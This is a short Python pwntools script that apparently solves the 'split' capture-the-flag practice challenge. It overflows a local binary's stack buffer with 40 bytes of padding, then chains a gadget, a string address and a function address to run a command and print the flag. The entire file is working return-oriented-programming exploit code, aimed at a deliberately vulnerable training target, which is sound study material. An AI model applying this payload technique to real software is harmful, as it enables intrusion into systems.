#!/usr/bin/python3
from pwn import *

# Note: Execute the exploit with ../exploit.py while in the same directory as the flag
elf = context.binary = ELF('./split', checksec=False)
# context.terminal = 'alacritty' # Use with gdb.debug

string_address = 0x00601060.to_bytes(8, 'little')
gadget_address = 0x004007c3.to_bytes(8, 'little')
function_address = 0x0040074b.to_bytes(8, 'little')

payload = b'a' * 40 + gadget_address + string_address + function_address
p = process('./split')
# p = gdb.debug('./x86_64/split', 'b main')
p.recvuntil('> ')
p.sendline(payload)
print(p.recvuntil('x86_64').decode())
